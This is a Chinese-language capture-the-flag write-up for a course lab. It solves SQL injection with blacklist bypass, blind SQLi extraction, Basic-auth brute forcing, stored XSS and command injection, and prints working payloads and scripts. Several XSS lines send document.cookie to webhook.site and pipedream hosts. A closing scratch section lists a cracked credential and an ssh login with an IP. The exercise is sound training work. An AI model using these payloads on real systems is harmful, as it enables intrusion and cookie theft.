---
title: CTF-Project2
tags: [CTF]

---

# ADL-Project 2

## chiikawa_login_1
F12裡有提示source code的位置 

<img width="660" height="174" alt="image" src="https://github.com/user-attachments/assets/db7a9487-9c82-4629-899d-2ba9f2df90a5" />


http://ctf.adl.tw:12003/?source

<img width="889" height="815" alt="image" src="https://github.com/user-attachments/assets/be2fd072-a7bd-41a5-8a5b-55b6648ab99d" />


### 觀察程式碼可知
**1. 原始查詢為：**
```sql
SELECT * FROM users WHERE `username` = '$username' AND `password` = '$password';
```

**2. 登入驗證部分：**
```php
$sql = "SELECT * FROM users WHERE `username` = '$username' AND `password` = '$password';";
```
登入成功的條件是匹配用戶名必為 Usagi 且密碼正確，使用直接拼接的方式執行查詢。
存在 SQL 注入風險。

**3. 黑名單使用了 str_ireplace 將特定字詞替換為空字串**
```php
$blacklist = array("union", "select", "where", "and", "or");
$replace = array("", "", "", "", "");
$username = str_ireplace($blacklist, $replace, $username);
$password = str_ireplace($blacklist, $replace, $password);
```
可以使用拆分字詞例如 UNION 可以用 UUNIONNION。

### 思路：使用 `UUNIONNION SSELECTELECT` 繞過黑名單
先嘗試 `username = ' UUNIONNION SSELECTELECT 'Usagi','1234' -- ` 失敗
猜測原始查詢應該是返回 3 個欄位：`id`、`username` 和 `password`。

且題目密碼欄位不能為空，要特別注意驗證邏輯
```php
if ($fetch["username"] === 'Usagi' && $fetch["password"] === $password)
```
會檢查查詢結果中的 `$username` 和 `$password` 

所以`UNION SELECT` 中插入的 `password`必須和 POST 的 `password`一致
否則`$loginStatus` 不會被設置為 True。

**payload:** (最後面一定要空格)
username:`'UUNIONNION SSELECTELECT 'Usagi','Usagi','1234' --`
password:`1234`
or
username:`'UUNIONNION SSELECTELECT  NULL,'Usagi','Usagi' --`
password:`Usagi`
```sql
SELECT * FROM users WHERE `username` = '' UUNIONNION SSELECTELECT 'Usagi','Usagi','1234' -- 
SELECT * FROM users WHERE `username` = '' UUNIONNION SSELECTELECT NULL,'Usagi','Usagi' -- 
```
第一部分 username = '' 不會返回結果，但無關緊要。
第二部分模擬了一筆記錄，username、password 和其他欄位都設為 Usagi。

**flag:** `ADL{Frieren, Beyond Journey's End...https://youtu.be/OIBODIPC_8Y}`

## chiikawa_login_2
第一題僅是成功登入拿到flag但並非真正密碼
所以第二題應該是要拿到真正的密碼

#### sqlmap
一開始先嘗試sqlmap的方法
(但這題似乎被禁用)

<img width="1426" height="368" alt="image" src="https://github.com/user-attachments/assets/606084ff-b6cd-4d75-8d57-50f65afd571c" />


#### blind SQL injection

沿用上一題思路
使用blind SQL injection (半暴力)
每次和正確密碼的一位進行比對
逐步累加到正確的flag `ADL{~}`

```python=
import requests
import time

# 目標 URL
url = "http://ctf.adl.tw:12003/"
known_password = ""
password_charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*-_=+[]}{;:,.<>?//|`~"

# HTTP 請求頭
header = {
    "Content-Type": "application/x-www-form-urlencoded"
}

num = 1  # 初始位置

while True:
    found_next_char = False
    for char in password_charset:
        # 構造 SQL 注入，使用變量 num
        payload = f"' UUNIONNION SSELECTELECT 'Usagi','Usagi', SUBSTRING((SELECT password FROM users WHERE username = 'Usagi'), {num}, 1) -- "

        data = {
            "username": payload,
            "password": ""  # 密碼不需要用來進行比對，直接留空
        }

        # 發送 POST 請求
        response = requests.post(url, headers=header, data=payload)

        # 將響應內容轉換為文本
        response_length = len(response.text)
        print(f"Trying: {payload} | Response Length: {response_length} | Status Code: {response.status_code}")

        # 檢查響應內容是否包含 "submit"
        if "submit" not in response.text:
            known_password += char
            print(f"[+] Found character: {char} -> Current password: {known_password}")
            found_next_char = True
            break
        else:
            print(f"[ ] Character {char} did not match.")

    if not found_next_char:
            print(f"[!] No matching character found at position {num}. Exiting.")
            break  # 結束程式或執行其他錯誤處理邏輯

    # 檢查是否找到 '}' 字符
    if '}' in known_password:
        print(f"[!] Detected '}}', stopping. Current password: {known_password}")
        break

    num += 1  # 增加 num，以便下次提取下一個字符
    time.sleep(2)  # 加入延遲以避免過於頻繁的請求

```
**flag:**`ADLCTF{Ulay@HAy@HAuLAUlay@HAy@HAuLA...https://www.youtube.com/watch?v=9tD5kbzDxRA}`


## koduckkoduck
我們查了一下這題的html碼發現有兩行不明的字串

<img width="635" height="416" alt="image" src="https://github.com/user-attachments/assets/7bcadd81-1d9f-4c2c-926d-d639ba0de329" />

分別對兩者進行base64解密後得到了以下資訊

<img width="381" height="448" alt="image" src="https://github.com/user-attachments/assets/e06f4baf-1f07-42cf-af77-e8ebeeb70c13" />

<img width="622" height="443" alt="image" src="https://github.com/user-attachments/assets/6cf95e68-725d-4302-840b-6280bc67fbf1" />


用burp suite抓網頁，然後用repeater，送request，看到在response中的set-cookie這邊也有不明字串
<img width="1145" height="489" alt="image" src="https://github.com/user-attachments/assets/44794690-22d5-43fd-aba3-df143077aae3" />

透過以上的資訊有兩種方法可以解決，使用curl找flag，或是看到flag底下又有一個_flag，Decode就得到
**flag:** `ADLCTF{C0Okie_i5_yummy!KoduckK0dUCK}`

<img width="1434" height="411" alt="image" src="https://github.com/user-attachments/assets/6a6351c7-1316-435a-838f-f9bf891d53a1" />

<img width="989" height="411" alt="image" src="https://github.com/user-attachments/assets/c791a5a4-90dc-4e0e-85bd-995afa45b094" />


## Subscribe
這題大致上是照著網頁給的提示一步一步進行修改即可。
首先透過GET並搭配以下header連上網頁。
<img width="693" height="183" alt="image" src="https://github.com/user-attachments/assets/47ec1e53-7f2d-4a46-866c-24285c687a6b" />

得到必須使用SUBSCRIBE method的提示。

<img width="534" height="181" alt="image" src="https://github.com/user-attachments/assets/db00bf38-7092-4faa-a23f-b41cfb1138ed" />


修改method後

<img width="695" height="187" alt="image" src="https://github.com/user-attachments/assets/69805ead-7479-4431-b710-fe792f0a8617" />

會得到以下的頁面，提示需使用SAKUNA_Browser

<img width="538" height="183" alt="image" src="https://github.com/user-attachments/assets/08858a69-bf11-40db-a5ea-63bdb6699b6f" />


我們可以去修改User-Agent達到這個要求

<img width="694" height="168" alt="image" src="https://github.com/user-attachments/assets/51c71417-478c-4cc6-9599-4833092a26c3" />

接續得到我們必須來自於`https://www.subscribesakuna.com`

<img width="537" height="183" alt="image" src="https://github.com/user-attachments/assets/54de82d0-81f3-4574-b600-8d56410dfa87" />


原來是直接加上`FROM`的標頭但發現不正確，後來查詢資料發現要使用的是`Referer`標頭

<img width="692" height="190" alt="image" src="https://github.com/user-attachments/assets/3d26194c-cdde-4bbe-ae24-c0ae26ef2050" />

接續得到必須有特定的`Host`

<img width="551" height="179" alt="image" src="https://github.com/user-attachments/assets/e0fef79e-eb00-4c12-8d85-764a1a07d2b3" />


同樣在標頭加入對應的`Host`

<img width="697" height="184" alt="image" src="https://github.com/user-attachments/assets/2579f538-7639-48b6-87aa-360dcb48fa4e" />


後來得到需要特定`cookie`的提示

<img width="534" height="197" alt="image" src="https://github.com/user-attachments/assets/2a9d81f2-625e-4cd3-b78c-c4a06c00cb9a" />


我們可以透過`Cookie: name=value`進行設定

<img width="696" height="198" alt="image" src="https://github.com/user-attachments/assets/682abaac-6a94-48ed-a62a-28323eeebb03" />

終於到了準備登入的畫面，在這邊有提示我們可以透過`darkweb2017-top10000.txt`這個檔案進行暴力破解

<img width="532" height="269" alt="image" src="https://github.com/user-attachments/assets/f0ea11e0-6d36-427d-9d4e-97d24fe608e2" />


讓我們先直接access`/admin`看看會得到甚麼結果

<img width="692" height="196" alt="image" src="https://github.com/user-attachments/assets/59893f76-3622-42ff-8520-20e01aac2798" />

可以發現這裡有兩個訊息，一個是需要使用`Basic`這個驗證方式

<img width="481" height="109" alt="image" src="https://github.com/user-attachments/assets/b1142110-6dc7-4a3d-9813-9758fda9fc14" />

另一個是驗證當中需要有輸入`username`與`password`

<img width="538" height="196" alt="image" src="https://github.com/user-attachments/assets/399d06a2-460d-4402-a45e-814b13443529" />

查詢了有關basic驗證的方法，提到我們需要在標頭加入`Authorization: Basic <credentials>`，並且其中的`<credentials>`是透過`<username>:<password>`再進行`base64`的編碼組成。

<img width="728" height="436" alt="image" src="https://github.com/user-attachments/assets/7d666758-775a-4652-8dc2-d1399c9a7330" />

原先我們預計使用`Burp Intruder`進行暴力破解，但發現免費版會有速度限制...

<img width="1363" height="830" alt="image" src="https://github.com/user-attachments/assets/4ac51355-2368-4c55-8e8d-fb5f8fc2aedf" />

因此我們自行開發了python script暴力破解密碼
```python
import base64
import requests
from time import sleep
from requests.exceptions import Timeout

# 定義目標 URL 和文件路徑
url = "http://ctf.adl.tw:12002/admin"

# 定義固定的請求標頭
headers = {
    "Host": "sakuna.com",
    "Cache-Control": "max-age=0",
    "Accept-Language": "zh-TW,zh;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "SAKUNA_Browser",
    "Referer": "https://www.subscribesakuna.com",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "sakuna=kawaiiiiiiiiiiiiiiiiiiiiiiYAHA",
    "Connection": "keep-alive",
}

# 打開文件並逐行處理
with open("./darkweb2017-top10000.txt", "r", encoding="utf-8") as f:
    for line in f:
        password = line.strip()  # 去除每行首尾的空白字符或換行符
        
        # 將 "SAKUNA:" 與密碼組合，並進行 Base64 編碼
        auth_string = f"SAKUNA:{password}"
        auth_base64 = base64.b64encode(auth_string.encode()).decode()

        # 將編碼結果添加到 Authorization 標頭中
        headers["Authorization"] = f"Basic {auth_base64}"

        try:
            # 發送 HTTP 請求
            response = requests.get(url, headers=headers, timeout=10)  # 設定 10 秒的超時時間

            # 檢查響應狀態碼
            if response.status_code == 200:
                print(f"Success! Password found: {password}")
                break
            else:
                print(f"Tried password: {password} - Status code: {response.status_code}")
        
            # 印出 Content-Length（如果存在）
            content_length = response.headers.get("Content-Length", "No Content-Length header received")
            print(f"Content-Length: {content_length}")
            
        except Timeout:
            # 如果超時，則休眠 30 秒再重試
            print("Request timed out. Sleeping for 30 seconds...")
            sleep(30)

print("Password cracking completed.")
```
因為在破解當中發現伺服器每隔一段時間(一定量的request？)就會timeout使得破解無法繼續，所以使用了`try except`的方式如果抓到`Timeout`就休息一段時間在繼續。

<img width="314" height="137" alt="image" src="https://github.com/user-attachments/assets/e50a4868-70c9-4720-8e14-09c757e1f8dc" />

<img width="189" height="528" alt="image" src="https://github.com/user-attachments/assets/c64b64ff-15fc-4344-9a19-8bdcd00a933b" />

最後我們使用了以下的header成功登入了`sakuna`

<img width="696" height="240" alt="image" src="https://github.com/user-attachments/assets/8530cef4-12a4-451f-a4d9-1ecfd5aa81e9" />

```
SUBSCRIBE /admin HTTP/1.1
Host: sakuna.com
Cache-Control: max-age=0
Accept-Language: zh-TW,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: SAKUNA_Browser
Referer: https://www.subscribesakuna.com
Authorization: Basic U0FLVU5BOnJhaW5ib3c2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: sakuna=kawaiiiiiiiiiiiiiiiiiiiiiiYAHA
```
以下是存在其中的flag

<img width="923" height="215" alt="image" src="https://github.com/user-attachments/assets/97035a60-c723-4e48-af8b-3a5c43788bc7" />

**flag**:`ADLCTF{s4kuNA_kAWA11_5uBSCR1Be_https://youtube.com/channel/UCrV1Hf5r8P148idjoSfrGEQ?si=ksHGQgL0ar79DH5Q}`


## msg_board

首先試著輸入的內容發現會被儲存在留言板上，然後發現如果寫入tag會被database儲存起來
同時這個網站是公開的，代表留言的內容會被其他人所看到
瀏覽這個網頁的人都會看到寫入的語法(執行寫入的Javascript)
因此推斷為Stored XSS

那能夠執行Javascript的話，最嚴重的就是偷cookie了，所以推斷flag可能在cookie裡

所以可以嘗試寫一個script，用fetch發request到server

網路上有推薦https://webhook.site/ 
可以自動記錄對網址發http request時的所有參數


**Webhook.site：**
提供一個臨時的 URL，用於接收並記錄 HTTP 請求，包括請求參數、標頭和內容。
在此例中，https://webhook.site/28abc064-fe98-471b-adee-30683a249f8c 是接收 Cookie 資料的伺服器地址。

`<image src=x onerror="fetch('https://接收的server/?'+document.cookie)">`

**image元素**
實際上應為 `<img>`，但瀏覽器允許容錯解析為圖片元素。
`src="x"` 指定了無效的圖片來源地址 x，因此加載失敗。

**onerror 屬性**
定義：當元素加載失敗時（如圖片無法加載），觸發 onerror 事件。
用途：這裡的 onerror 屬性執行了一段 JavaScript，目的是利用失敗的加載觸發惡意行為。

**fetch() 函數**
用於向伺服器發送 HTTP 請求。
```javascript
fetch('<URL>' + document.cookie)
URL：https://webhook.site/28abc064-fe98-471b-adee-30683a249f8c/
```
URL：https://webhook.site/28abc064-fe98-471b-adee-30683a249f8c/
查詢參數：通過 document.cookie 獲取當前頁面的 Cookie，並附加到 URL 中。


**payload**
```html
範例：
<image src=x onerror="fetch('https://接收的server/?'+document.cookie)">
    
我的：
<image src=x onerror="fetch('https://webhook.site/28abc064-fe98-471b-adee-30683a249f8c/?'+document.cookie)">
```
> 使用 [https://webhook.site/](https://)
> <img width="1912" height="870" alt="image" src="https://github.com/user-attachments/assets/439fb26c-2c01-4317-b372-04f06e22e291" />
> 
**flag:** `ADLCTF{s@kuNa_D@!5uk!_No_5MokiN9}`
## Pokedex
有了前面的經驗，一樣先找看看source code
http://ctf.adl.tw:12005/?source

> <img width="779" height="608" alt="image" src="https://github.com/user-attachments/assets/f25da59d-780c-4fb9-9f80-913898628bd7" />


常見指令符號都在blacklist裡面，但還是有可以用的
像`$`，`cat` 可改成 `tac`，flag 可嘗試 `f1ag` 或 `f[l]ag`，一開始嘗試 `{"number":"001"}`
後面接的指令都被當作字串

本來以為會直接打出flag，結果意外發現能和圖片一起嵌入指令
> <img width="436" height="400" alt="image" src="https://github.com/user-attachments/assets/ec07a173-c960-4c9d-8230-dab0652ca892" />


將單引號正確插入`{"number":"001'$(ls )'"}`，結束字串後讓'$(ls ..)'不會被當成字串
`ls`命令，列出當前目錄中的檔案，顯示目錄中的文件
> <img width="635" height="464" alt="image" src="https://github.com/user-attachments/assets/650647c6-8194-473c-a9b8-ae1161e8b52c" />

`"001index.php koduck.gif koduck_dance.gif koduck_scream.gif koduck_turnaround.gif pokedex_images"`

玩玩看，找flag放在哪
> <img width="649" height="445" alt="image" src="https://github.com/user-attachments/assets/ad6fb811-8c20-42a7-b2c9-07fb42adc7f5" />

`{"number":"001'$(ls pokedex_images)'"}`
> <img width="637" height="459" alt="image" src="https://github.com/user-attachments/assets/7964ddf4-b597-4b1d-81f6-612c55ec0b40" />

`{"number":"001'$(ls /)'"}`
> <img width="631" height="467" alt="image" src="https://github.com/user-attachments/assets/b69cbca7-8ae7-4504-8ccb-456019d8d051" />

找到flag目錄
`{"number":"001'$(tac /f[l]ag)'"}`
> <img width="633" height="448" alt="image" src="https://github.com/user-attachments/assets/27337bdf-fe7c-4a39-8d28-1b35f6230c9f" />

**flag:** `ADL{CMD_1njECT!0n_By_koDuck}`


------

SAKUNA:rainbow6

ssh -i C:\Users\USER\myVM_key.pem azureuser@20.55.27.80


http://ctf.adl.tw:12004/


(可以)
```
<iframe onload="window.location.href='https://eorn7qrhmk3np62.m.pipedream.net/'+document.cookie">


<iframe style="display:none" src="javascript:fetch('https://eorn7qrhmk3np62.m.pipedream.net/?'+document.cookie)"
></iframe>
```

(不行)
```
<div style="visibility:hidden" onload="fetch('https://eorn7qrhmk3np62.m.pipedream.net/?'+document.cookie)"></div>

<a href="#" onmouseover="fetch('https://20.55.27.80:80/?'+document.cookie)">test</a>



<image style="display:none" src="javascript:fetch('https://eorn7qrhmk3np62.m.pipedream.net/?'+document.cookie)">

<image src=x onerror="fetch('https://eorn7qrhmk3np62.m.pipedream.ner/?'+document.cookie)">


<image style="display:none"
src="javascript:fetch('https://eorn7qrhmk3np62.m.pipedream.net/?'+document.cookie)">
```



